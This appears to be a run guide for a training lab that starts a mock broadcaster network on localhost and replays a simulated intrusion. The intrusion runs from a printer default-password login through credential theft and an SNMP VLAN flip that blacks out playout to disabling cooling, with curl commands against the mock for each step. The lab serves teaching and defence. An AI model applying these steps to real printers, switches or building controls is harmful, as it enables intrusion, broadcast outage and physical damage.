# Run guide — mock estate + attack replay (2 minutes)

You don't need any Kaveri hardware. The mock is a small Python web server with dummy data that behaves like the real thing: printers with default passwords, stored credentials, file shares, a media library, an SNMP switch, playout status, building controls, the works.

## 1. Install (once)

```bash
pip install flask requests
```

That's it. No database, no docker, nothing else.

## 2. Start the dummy estate

Terminal 1:

```bash
cd kaveri_case/mock_server
python app.py
```

You should see `Running on http://127.0.0.1:5000`. Open that in a browser — there's a clickable index of every fake system (`/printers`, `/playout/status`, `/cmdb`, ...).

Quick sanity checks (browser or curl):

- `GET /health` → `{"ok": true, ...}`
- `GET /printers` → 5 dummy printers, 4 still on default (stands in for 318/340)
- `GET /playout/status` → all four `ON AIR`
- `GET /cmdb` → 2,900 known vs 1,327 invisible

## 3. Replay the attack

Terminal 2:

```bash
cd kaveri_case/exploit
python hack_simulation.py --base http://127.0.0.1:5000 --log simulation_output.log
```

Watch it walk Steps 0–8: printer login with `admin123`, credential pull, rundown theft, media reads, SNMP string grab, VLAN flip (playout goes BLACK while automation says "normal" and EDR stays empty), BMS disable (41°C), noise ruled out, forum post. It restores the switch and cooling at the end so you can re-run it.

The transcript lands in `simulation_output.log` (ours is already there from our run — compare yours).

## 4. Poke around by hand (optional, fun)

```bash
# printer default login + credential disclosure (F4/F5)
curl -s -X POST localhost:5000/printer/CHN-PR-043/login -H 'Content-Type: application/json' -d '{"password":"admin123"}'
# -> {"ok": true, "token": "tok-..."}
curl -s 'localhost:5000/printer/CHN-PR-043/config?token=tok-CHN-PR-043-1'

# rundowns as the printer account (F7/F8)
curl -s 'localhost:5000/shares/rundowns?user=KAVERI%5Csvc-printscan'

# media library as any Domain Users member (F23)
curl -s 'localhost:5000/mam/assets?user=KAVERI%5Csvc-printscan&n=3'

# SNMP read + disruptive write (F10-F13)
curl -s 'localhost:5000/snmp/switch/chg-gallery-dist-01?community=private-kaveri-2018' | head -c 400; echo
curl -s -X POST localhost:5000/snmp/switch/chg-gallery-dist-01/set -H 'Content-Type: application/json' -d '{"write_community":"private-kaveri-2018","vlan":999}'
curl -s localhost:5000/playout/status   # -> BLACK
curl -s -X POST localhost:5000/snmp/switch/chg-gallery-dist-01/restore  # put it back

# BMS with no auth at all (F16/F17)
curl -s -X POST localhost:5000/bms/chg-gallery-ahu-01/command -H 'Content-Type: application/json' -d '{"action":"disable"}'
curl -s localhost:5000/bms/chg-gallery-ahu-01/status  # -> 41.0
curl -s -X POST localhost:5000/bms/chg-gallery-ahu-01/command -H 'Content-Type: application/json' -d '{"action":"enable"}'
```

## 5. Stop

Ctrl+C in terminal 1. Nothing to clean up — all state is in memory and resets on restart.

## Troubleshooting

- **Port 5000 busy?** Another app (sometimes macOS AirPlay) may own it. Edit the last line of `app.py` to another port (e.g. 5050) and pass `--base http://127.0.0.1:5050`.
- **Module errors?** Make sure you installed with the same Python you run with (`python -m pip install flask requests` is the safest).
- **Weird output?** The mock seeds historic counters (41,000 reads etc.) on startup — that's intentional, mirroring the case. Live actions append on top.

Have fun — and remember, every password here is dummy. The lesson (change your defaults, count your printers) is very real.
